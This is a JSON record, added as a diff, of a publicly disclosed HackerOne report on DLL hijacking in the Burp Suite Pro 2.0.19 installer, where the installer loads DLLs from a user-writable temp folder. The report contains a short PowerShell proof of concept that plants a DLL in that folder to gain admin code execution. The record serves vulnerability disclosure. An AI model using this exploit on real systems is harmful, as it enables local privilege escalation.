@@ -1,0 +1,136 @@
+{
+  "id": 518837,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MTg4Mzc=",
+  "url": "https://hackerone.com/reports/518837",
+  "title": "DLL Hijacking in Burp Suite Pro 2.0.19 Installer",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "medium",
+  "readable_substate": "Informative",
+  "created_at": "2019-03-29T18:35:16.531Z",
+  "submitted_at": "2019-03-29T18:35:16.531Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "freetom",
+    "url": "/freetom",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15252,
+    "url": "https://hackerone.com/portswigger",
+    "handle": "portswigger",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/252/60e8778f4f1fee57ea2b164a7d2ec1e2d2dd7bc8_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "PortSwigger Web Security",
+      "twitter_handle": "Burp_Suite",
+      "website": "https://portswigger.net",
+      "about": "Burp Suite is the leading software for web security testing"
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2019-04-01T09:37:11.444Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-04-01T09:31:33.669Z",
+  "team_member_agreed_on_going_public_at": "2019-04-01T09:37:11.382Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I've found that the latest installer of Burp Suite Pro tries to load some DLLs from an unprotected folder. After providing it with admin privileges (required to install) it tries to load these DLLs:\n\n```\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\WINMM.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\WSOCK32.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\VERSION.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\WINMMBASE.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\DBGHELP.DLL\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\dbgcore.DLL\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\lib\\libjava.base-coop.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\lib\\libjava.logging-coop.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\lib\\libjdk.compiler-coop.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\lib\\libjdk.scripting.nashorn-coop.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\lib\\libjdk.internal.vm.ci-coop.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\lib\\libjdk.internal.vm.compiler-coop.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\WINHTTP.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\urlmon.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\iertutil.dll\nC:\\Users\\bortto\\AppData\\Local\\Temp\\e4jA5E5.tmp_dir1553882416\\jre\\bin\\CRYPTBASE.DLL\n```\n\n`e4jA5E5.tmp_dir1553882416` is a temporary folder that is created just in time by the installer but its ACL doesn't protect it from modifications by the current user. The folder is dynamically created, though there is a time window in which a local attacker (that has a program running as the current user but looks for escalating privileges for persistence, etc.) can find the folder and inject a DLL and get code execution as admin.\n\nI created the following script to exploit the issue:\n\n```\n$output = \"\"\nwhile(!$output){\n        Start-Sleep -milliseconds 10\n        $output = Get-process | where {$_.ProcessName -like 'burpsuite_pro_windows-x64*'}\n}\nStart-Sleep -milliseconds 1000\n$f = (Get-ChildItem -Filter \"*tmp_dir*\" C:\\Users\\bortto\\AppData\\Local\\Temp\\ | ?{ $_.PSIsContainer } | Sort CreationTime -Descending | Select -First 1).Name.trim()\n\nWrite-Host \"$f\"\n\nCopy-Item -Path \"C:\\users\\bortto\\Downloads\\Project1.dll\" -Destination \"C:\\Users\\bortto\\AppData\\Local\\Temp\\$f\\jre\\bin\\DBGHELP.dll\"\n```\n\nI attach `Project1.dll` (is just a DLL that upon loading pops a message box with the current user). I compiled it myself.\n\nI also attach a video that shows the PoC running successfully (note: the few seconds of black screen are due to Windows UAC popup). I tested the video and is viewable with Windows Media Player.\n\n## Impact\n\nLocal Privilege Escalation",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 454676,
+      "file_name": "Project1.dll",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/454/676/4dd75e2593a0f1d2ffdf31cc271d81b33c777682/Project1.dll?response-content-disposition=attachment%3B%20filename%3D%22Project1.dll%22%3B%20filename%2A%3DUTF-8%27%27Project1.dll&response-content-type=application%2Fx-dosexec&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132017Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=68732b5d8934cc66e0987dd75d20e2ad73c71c8ea5630009a70e02b3a0cc2b03",
+      "file_size": 125216,
+      "type": "application/x-dosexec",
+      "moderated": null
+    },
+    {
+      "id": 454677,
+      "file_name": "privesc_burp.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/454/677/572084b37876315566bffe1d8cd64006e3003e41/privesc_burp.mp4?response-content-disposition=attachment%3B%20filename%3D%22privesc_burp.mp4%22%3B%20filename%2A%3DUTF-8%27%27privesc_burp.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3H257GYG%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T132017Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIGoOoD7IqdXlQSMALqfdmBHb%2FwisMvEm1NldXxdnNeYCAiARy2w%2BYbeWpCI595roGwDkus42Lbn86e5evWfxBT9NOSqyBQh1EAMaDDAxMzYxOTI3NDg0OSIMhPAKuxRXUmGeFQneKo8F3DcJJTLeqY4WL2LSYxnsh9sLc5TIBgXhMZcfnWnfMScNTJ5phuisFPjvWUDTRl2jiPdCnVNDEZTh0V%2FzIfuaRGTEFLdttdVM%2B7XRPGS6Z0DsZrpCecbEHHiNrvbSv9rEH4WRaiYG2AiT800A%2BhISire0KP%2FxWN%2Bq3fGg3S7IYi3fo9FxjeHTJXwzRwtp8p2sKp0llq1XgyIM5HcUKwfeJRLDxhXB4KjtrJm8Nl1HJjYd38Kl4OOD%2BVQ4qgxVg6S3QUXiVui8uRmS6QSomCFcHKrWwhKDdkwleR0A2DhXEcMBOpr5uZdFBRMTTLVfLJqt8b7Gn%2FP1kEndSvANJn4pKANWGSKKrLKm%2FW5SYwuMcwCwVWZkm2kI7%2FaC07CZWLriJLbb0B9h3p9uZQd2JXPcy9UJrOtHD39hJ2TSV7hqrFKdIH1VDFc1o4xN9CfMK41Iz19t%2BXB%2BiBobpQMJkamH6%2BMqlg%2BRnibesjoUaznTAKjTv04b1H2Gfup9n8qf1CYIWVaypF0psfpQ4tvZMbk6A9lrEcUCjjcacQFwHaOjcE1VoMC9x8Y3SAcSGe1fgFB6OLJLsOalgVmTZQIr2sn%2FSBi9GibFMnQs9e5r%2F7uE1BdL1f%2FCFWqUOKwCQctUsNAkTlcVSIqcZpy6Wm2pgFJXvhoksSuVTlHoBuvWUpF4GomHdrlRKMJqiHROUMKzy4%2Bellc5ulcf3UuSY1k6dZTA5MpfF5QPJ2XV03V5EhF2iFMJDrqHZ%2B%2F0jo2dVNDNDizcLLqOfvfM%2BmZ7IXWl4eYmGZQoTIUs3oLbjrHhfzw1vaH3uiu8ixoDFPI3JWnWXXw%2ByN4jhOjFQUQU%2FCtTyf5HAodU0A%2FQKW77PGnTKFcxtzDMra2uBjqyAVQAtnTFFvc7GDPSVsVDtdiaEYk9BpW%2Fv8Td%2BbCI38P1sNEwB4ogOEtNgM7ztuaNj2ZReYSVM3%2BIJgEPDNx5i2UO45PoOWvvUmsULL9KC8Xx45bNoDwGXKdZ6pe2GQq%2Fsv22h8ChmpFIOFcTfENahRl6cIPxSXPhniNCt1V5BiQ%2FiqrO5YcfhIscKvt0FrmdE0Oc8bj0IS5H4NQvWQZaNALTeEhhVoNMsjxWfsEi6d9j4XE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dcfe4e0f0f918a44a00ec13a74d29398b59f4f4647b308ce217d6cdfee2e67a4",
+      "file_size": 1788474,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 16,
+  "voters": [
+    "sameerphad72",
+    "khizer47",
+    "olegeekk",
+    "kaunghtetzaw",
+    "iamcoolcat",
+    "blueboy33",
+    "elliott-io",
+    "radarsardar",
+    "jillianhax",
+    "qwertmcgurt",
+    "and 6 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 169,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "Burp Suite Pro/Community",
+    "max_severity": "high"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
